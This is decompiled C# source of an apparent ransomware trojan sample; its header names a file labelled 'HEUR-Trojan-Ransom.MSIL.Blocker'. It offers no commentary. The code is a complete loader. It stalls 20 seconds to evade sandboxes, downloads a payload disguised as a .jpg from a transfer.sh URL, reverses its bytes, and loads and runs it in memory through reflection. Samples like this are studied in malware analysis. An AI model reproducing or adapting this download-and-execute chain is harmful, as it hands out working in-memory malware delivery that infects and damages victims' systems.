// Decompiled with JetBrains decompiler
// Type: Mpnro.Program
// Assembly: Odhxu, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D58FC60E-2A94-4C08-A522-23D0043A2B99
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Ransom.MSIL.Blocker.gen-259623eb247a6097428b12638fff930d83f00698bb155141256efffd1e7f9f71.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Mpnro
{
  internal class Program
  {
    private static byte[] bb;
    private static List<Type> types;

    [STAThread]
    private static void Main(string[] args)
    {
      if (!Program.Writing())
        return;
      Console.WriteLine((object) DateTime.Now);
      Program.YamenReader();
      Program.HelloWorld();
      Program.Read();
      Program.OverWrite();
    }

    private static bool Writing()
    {
      try
      {
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch
        {
        }
        Stopwatch stopwatch = new Stopwatch();
        stopwatch.Start();
        TimeSpan timeSpan = TimeSpan.FromSeconds(20.0);
        double totalSeconds = timeSpan.TotalSeconds;
        while (true)
        {
          timeSpan = stopwatch.Elapsed;
          if (timeSpan.TotalSeconds < totalSeconds)
            typeof (Thread).GetMethod("Sleep", new Type[1]
            {
              typeof (int)
            }).Invoke((object) null, new object[1]
            {
              (object) 10
            });
          else
            break;
        }
        stopwatch.Stop();
        return true;
      }
      catch
      {
      }
      return false;
    }

    private static void YamenReader()
    {
      while (Program.bb == null)
      {
        try
        {
          Program.bb = new BinaryReader(WebRequest.Create("http://transfer.sh/get/1KEmBC/Odhxu.jpg").GetResponse().GetResponseStream()).ReadBytes(88561519);
        }
        catch
        {
        }
      }
    }

    private static void HelloWorld()
    {
      if (Program.bb == null)
        return;
      Array.Reverse((Array) Program.bb, 0, Program.bb.Length);
      AppDomain.CurrentDomain.Load(Program.bb);
    }

    private static void Read()
    {
      foreach (Assembly assembly in AppDomain.CurrentDomain.GetAssemblies())
      {
        foreach (Type type in assembly.GetTypes())
        {
          if (type.FullName == "Xgoxdxcflavbkt.Fdwgjpdelve")
          {
            Program.types = new List<Type>();
            Program.types.AddRange((IEnumerable<Type>) assembly.GetTypes());
            break;
          }
        }
      }
    }

    private static void OverWrite()
    {
      if (Program.types.Count <= 0)
        return;
      Program.bb = (byte[]) null;
      GC.Collect();
      foreach (Type type in Program.types.ToList<Type>())
      {
        foreach (MethodInfo method in type.GetMethods())
        {
          if (method.Name == "Flvjcsavbswyhmut")
            Console.WriteLine((bool) method.Invoke((object) null, (object[]) null));
        }
      }
    }
  }
}
